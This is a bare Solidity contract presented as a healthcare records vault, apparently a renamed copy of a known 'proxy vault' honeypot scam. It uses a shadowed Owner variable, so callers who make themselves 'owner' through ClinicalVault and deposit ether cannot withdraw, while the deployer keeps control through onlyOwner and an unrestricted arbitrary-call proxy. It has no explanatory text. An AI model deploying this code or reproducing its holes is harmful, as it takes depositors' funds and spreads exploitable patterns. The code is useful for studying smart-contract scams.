pragma solidity ^0.4.24;

contract HealthcareProxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transfercareCustodian(address _owner) public onlyOwner { Owner = _owner; }
    function healthcareProxy(address goal, bytes record) public payable {
        goal.call.value(msg.value)(record);
    }
}

contract RecordsProxy is HealthcareProxy {
    address public Owner;
    mapping (address => uint256) public Payments;

    function () public payable { }

    function ClinicalVault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            submitPayment();
        }
    }

    function submitPayment() public payable {
        if (msg.value > 0.5 ether) {
            Payments[msg.sender] += msg.value;
        }
    }

    function dischargeFunds(uint256 quantity) public onlyOwner {
        if (quantity>0 && Payments[msg.sender]>=quantity) {
            msg.sender.transfer(quantity);
        }
    }
}